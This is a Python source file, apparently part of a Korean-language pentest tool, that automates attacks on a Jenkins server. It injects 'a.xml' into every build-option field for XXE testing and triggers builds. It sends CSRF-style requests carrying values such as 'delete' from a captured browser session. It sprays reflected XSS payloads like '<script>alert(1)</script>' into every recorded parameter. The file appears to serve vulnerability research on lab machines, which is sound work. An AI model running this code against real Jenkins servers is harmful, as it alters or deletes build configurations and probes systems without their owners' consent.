from selenium import webdriver
import pandas as pd
import requests as req
from src.func import *
from tqdm import tqdm
import src.build_option_handler as b_option
import time

#@ Jenkins에서
def xxe_on_build_after_option(chrome, url, port, path, id, pw, job_name):
    target = f"http://{url}:{port}/{path}"
    chrome.get(target)
    option = b_option.build_option(chrome,url,port,id,pw,job_name)
    option.delete_all_options()

    build_url = f"http://{url}:{port}/job/{job_name}/build?delay=0sec"

    #빌드 눌러주기 세팅
    session = req.session()
    r_login(session,url,port,id,pw)

    crumb = get_r_session_crumb(session,url,port)

    job_build_launch(session,build_url,crumb)

    add_build_option_button = get_add_build_option_button(chrome)
    add_after_build_btn = get_add_after_build_button(chrome)

    build_option_btn_list = [add_build_option_button,add_after_build_btn]

    save_btn, apply_btn = get_submit_and_apply_button(chrome)

    result_row = []

    #빌드 추가 버튼이랑 빌드후 작업 추가 버튼 두번 반복
    for btn in build_option_btn_list:
        # 빌드 add 부분으로 이동 (처음 클릭해줘야 bd 태그를 가져올 수 있음)
        scroll_to_element(chrome, btn)
        sleep(2)
        btn.click()

        board = chrome.find_elements(By.CLASS_NAME, "bd")
        li_list = board[-1].find_elements(By.TAG_NAME, "li")


        #build add버튼을 눌렀을때 li가 나오는데 그거 선택 가능
        for i in tqdm(range(0, len(li_list)), mininterval=2):
            chrome.execute_script("arguments[0].click();", li_list[i])
            li_name = li_list[i].find_element(By.TAG_NAME, "a").get_attribute("innerHTML")
            sleep(1)

            divs = chrome.find_elements(By.TAG_NAME, "div")
            divs.reverse()

            #div를 전수 조사해서, 추가된 div의 inntertext가 추가된 div의 이름과 같다면 input값을 찾아서 key send를 해줌
            for div_in_li_name in divs:
                if div_in_li_name.get_attribute("innerText").startswith(li_name):
                    del_buttons = div_in_li_name.find_element(By.TAG_NAME, "button")
                    container = div_in_li_name.find_element(By.XPATH,'..')
                    c_input_tag_list = container.find_elements(By.TAG_NAME, 'input')

                    for c_input in c_input_tag_list:
                        if c_input.get_attribute("type")=="text":
                            #공백일 경우 그냥 넣고 아니면 임시 변수에 값을 저장하고 clear후 넣고 에러뜨면 다시 임시 변수에 있는거 넣어줌
                            if c_input.get_attribute("value")!='':
                                scroll_to_element(chrome,c_input)
                                sleep(1)
                                tmp_data = c_input.get_attribute("value")
                                scroll_to_element(chrome, c_input)
                                sleep(2)
                                try:
                                    c_input.clear()
                                except:
                                    pass

                                try:
                                    c_input.send_keys('a.xml')
                                except:
                                    pass
                                sleep(0.5)
                                apply_btn.click()
                                sleep(1)
                                error_status = jenkins_error_alert(chrome)

                                if error_status==True:
                                    c_input.clear()
                                    c_input.send_keys(tmp_data)
                                    sleep(0.5)

                            else:
                                scroll_to_element(chrome,c_input)
                                sleep(2)
                                try:
                                    c_input.send_keys('a.xml')
                                except:
                                    pass
                                sleep(0.5)
                                apply_btn.click()
                                sleep(1)
                                error_status = jenkins_error_alert(chrome)

                                if error_status==True:
                                    c_input.clear()
                                    sleep(0.5)

                    #leak한 crumb를 담아서 request를 보내서 빌드를 실행시킴
                    job_build_launch(session, build_url, crumb)
                    Day_of_Record = time.strftime("%D")
                    Recorded_Time = time.strftime("%H :%M: %S")

                    row_data = [url, port, id, job_name, li_name, Day_of_Record, Recorded_Time]
                    result_row.append(row_data)

                    scroll_to_element(chrome, del_buttons)
                    sleep(1.5)
                    del_buttons.click()
                    sleep(1.5)
                    scroll_to_element(chrome, btn)
                    sleep(2)

                    #Delete Workspace가 있어서 파일이 삭제됨
                    if btn==add_after_build_btn:
                        if i< len(li_list)-2:
                            btn.click

                    else:
                        if i < len(li_list)-1:
                            btn.click()
                    sleep(1)
                    break

    return result_row


def Csrf_protection_check(chrome, url, port, id, pw, path, action, value, value_type):
    try:
        uri = f"http://{url}:{port}{path}"
        chrome.get(uri)
        print("접속 시도")
        login(chrome,id,pw,"not first")
        sleep(1)
    except:
        print("접속중.....")

    try:
        info = []
        with open("user_info.txt", "r") as user:
            info = user.readlines()

    except:
        print("유저 에이전트 정보를 위한 파일이 필요합니다. user_info.txt를 생성하고 구글에 my user agent를 쳐서 나온 값을 파일에 넣어 주세요")

    user_agent = info[0]

    #EXPLOIT!
    if value=="input":
        if "name" in value_type:
            key= value_type[6:]
            value = "delete"

    else:
        key, value = "submit", "wawawawawawa"

    not_valid_key = ['Jenkins-Crumb']

    if key not in not_valid_key:
    #세션을 가져옴
        session = get_session(chrome, user_agent)
        payload = action
        if "http" not in payload:
            payload = uri+payload
        exploit_data = {key:value}

        #파라미터 날려보고 response 받음, 근데 delete같이 페이지를 삭제하면 404떠서 dummy값 날림
        response = session.get(payload+'/', params=exploit_data)
        sleep(1)

        return key, value, response

    else:
        print("Skip")
        return 0,0,0

def xss_sidevar_point():
    #@todo 소연이가 만든거 붙이기
    print("will be mearge")


def xss_reflected_all_param(url, port,id, pw, vm_num):
    #일단 로그인해서 세션 생성
    url = f"http://{url}:{port}"

    cheatsheet = [
        "<img src='x' onerror='alert(1)'",
        "<script>alert(1)</script>"
    ]
    allow_response = [
        200,
        302
    ]

    ignore_param_list = [
        'Jenkins-Crumb',
        'json'
    ]
    with open("./user_info.txt") as u_info:
        user_agent = u_info.readlines()[0]

    session = req.session()
    headers = {
        "User-Agent" : user_agent
    }
    session.headers.update(headers)
    session.get(url+"/login?from=%2F")
    login_data = {
        "j_username": id,
        "j_password": pw,
        "from" : "/",
        "Submit" : ""
    }
    session.post(url+"/j_spring_security_check", data = login_data)

    file_name = f"Scanning_all_param_result_vm{vm_num}_{id}.csv"
    csv_data = pd.read_csv(f"./csv/{file_name}")
    csv_data.sort_values(by="Action", ascending=False)
    csv_data_len = len(csv_data.index)
    print("csv_Data" ,csv_data_len)

    #공격에 사용될 데이터 가공
    param_dict = {}
    result_file_row = []



    Frame = csv_data.loc
    for i in tqdm(range(csv_data_len),mininterval=1):

        Action = Frame[i]['Action']
        param_dict[Frame[i]['Parameter']] = Frame[i]['Value']
        #{param : value}

        #Action이 바뀌었을 경우
        if i+1 == csv_data_len or Action != Frame[i+1]['Action']:
            # [param1, param2.....] It will be used keys
            param_list = csv_data[csv_data['Action'] == Action]['Parameter'].to_list()
            print(param_list)


            for i in range(len(param_list)):
                tmp_data = param_dict[param_list[i]]

                for sheet in cheatsheet:
                    param_dict[param_list[i]] = sheet
                    payload = f"{Action}/?"

                    for j in range(len(param_list)):
                        print(param_dict[param_list[j]])
                        if param_dict[param_list[j]] == 'NaN':
                            param_dict[param_list[j]] = ''

                        if j<len(param_list)-1:
                            payload+=f"{param_list[j]}={param_dict[param_list[j]]}&"
                        else:
                            payload += f"{param_list[j]}={param_dict[param_list[j]]}"

                    res = session.get(payload)
                    if res.status_code in allow_response:
                        if sheet in res.text:
                            result_file_row.append([url, id, Action, payload, sheet])
                param_dict[param_list[i]] = tmp_data

            #파라미터 초기화
            param_dict = {}

    #결과물 출력
    return result_file_row


def Stroed_xss():
    print("todo")
    #@ todo